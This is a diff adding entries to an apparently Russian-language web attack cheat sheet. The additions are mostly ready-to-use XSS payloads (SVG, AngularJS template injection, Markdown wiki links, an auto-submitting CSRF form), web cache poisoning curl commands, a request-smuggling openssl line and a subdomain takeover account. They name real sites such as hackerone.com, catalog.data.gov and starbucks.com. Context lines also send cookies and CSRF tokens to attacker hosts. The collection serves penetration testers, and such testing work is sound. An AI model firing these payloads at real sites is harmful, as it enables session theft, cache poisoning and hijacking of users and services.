@@ -337,6 +337,12 @@ php?email='-alert(document.domain)-'
 
 input[name=csrf_token][value=^a]{background-image:url('http://attack.com/log.php?a');}
 
+mobile-phones-tablets/ph-'*alert(1)*'%3E%3Cimg%20src=x%3Easdf?q=qwerty
+
+";alert(1)//535"
+
+"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"
+
 XSS с помощью css:
   <style>img{background-image:url('javascript:alert(1)')}</style>
 
@@ -355,6 +361,10 @@ Polyglot XSS - Mathias Karlsson
 "><img src=x onerror=prompt(document.domain)>
 
 "/><svg/onload=alert(document.cookie);> 
+
+<svg><discard onbegin=alert(1)>
+
+#<img/src="1"/onerror=alert(1)>
 
 DOM
   /download#"><img src=x onerror=prompt(/xss/);>
@@ -431,10 +441,50 @@ XSS reflected через заголовок http Referer
   "><SCRIPT>var+img=new+Image();img.src="http://attack/"%20+%20document.cookie;</SCRIPT>
   q=qwerty+%3Cscript%3Eevil_script()%3C/script%3E
   
+При отписке
+unsubscribed?email=email@gmail.com'"><svg/onload=alert(document.domain)>
+unsubscribed?email=email@gmail.com%27%22%3E%3Csvg/onload=alert(document.domain)%3E
+
+XSS через CSRF
+<html>
+<body onload='document.forms[0].submit()'>
+  <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
+    <input name='name' value='New Test"><img src=x onerror=prompt(1)>'>
+    <input name='is_private' value='false'>
+  </form>
+</body>
+</html>
+  
 Прочее
   $(sleep 20)<script>alert(1)</script> "> <img src="x" onerror=promt(1);>
   в IIS возможно создать XSS payload не только в форматах типа html/xml? Оказывается, что вектор для XML <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script> может быть загружен со следующими расширенями: .dtd .mno .vml .xsl .xht .svg .xml .xsd .xsf .svgz .xslt .wsdl .xhtml, а вектор <script>alert(1337)</script> будет работать в форматах .cer .hxt и .htm
   
+Stored XSS, используя специфическую для Wiki иерархическую ссылку Markdown на страницах Wiki.
+Title: javascript:
+Format: Markdown
+Content: [XSS](.alert(1);)
+
+ANGULAR
+?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
+  
+```
+
+**Practical Web Cache Poisoning**
+```
+url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"
+
+An attacker can easily poison the cache in arbitrary regions by using a service like https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:
+
+curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/'
+
+
+An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.
+
+curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
+
+This attack can also be done using the X-Forwarded-Host header:
+curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
+
 ```
 
 **Authentication bypass**
@@ -769,6 +819,11 @@ CSRF to XSS
 
     GET /?url=dict://localhost:11211/stat HTTP/1.1
     Host: example.com
+
+Можно попробовать такой способ
+echo -e 'GET @█████/ HTTP/1.1\r\nHost: alerts.newrelic.com\r\n\r\n' | openssl s_client -ign_eof -connect alerts.newrelic.com:443
+
+
 ```
 
 **HTTP Parameter Pollution**
@@ -831,6 +886,13 @@ Parameter pollution in social sharing buttons
     toAccount=9876&amount=1000&fromAccount=12345&toAccount=99999
 ```
 
+**Subdomain takeover**
+```
+Висящая запись CNAME datacafe-cert.starbucks.com указывает на s00397nasv101-datacafe-cert.azurewebsites.net, который не был заявлен вами. Я зарегистрировал службу с этим именем и, следовательно, смог захватить поддомен.
+
+Сначала я перечислил разные субдомены для starbucks.com. Затем я проверил, есть ли в этих доменах запись cname, указывающая на azurewebsites.net. Для каждого соответствующего домена я выполнил запрос DNS для записи в записи CNAME. Если это возвращает NXDOMAIN, поддомен обычно может быть принят, и возможно зарегистрировать домен, который соответствует записи NXDOMAIN CNAME.
+```
+
 **Удаленное выполнение кода**
 ```
 .../index.php?page=1;phpinfo()
@@ -854,6 +916,21 @@ http://html5sec.org/
 https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
 https://github.com/payloadbox/xss-payload-list
 https://github.com/s0md3v/AwesomeXSS
+
+Markdown's XSS Vulnerability
+https://github.com/showdownjs/showdown/wiki/Markdown's-XSS-Vulnerability-(and-how-to-mitigate-it)
+
+XSS without HTML: Client-Side Template Injection with AngularJS
+https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
+
+Practical Web Cache Poisoning
+https://portswigger.net/research/practical-web-cache-poisoning
+
+Bypassing Web Cache Poisoning Countermeasures
+https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures
+
+HTTP Desync Attacks: Request Smuggling Reborn
+https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
 
 XXE Payload
 https://gist.github.com/staaldraad/01415b990939494879b4
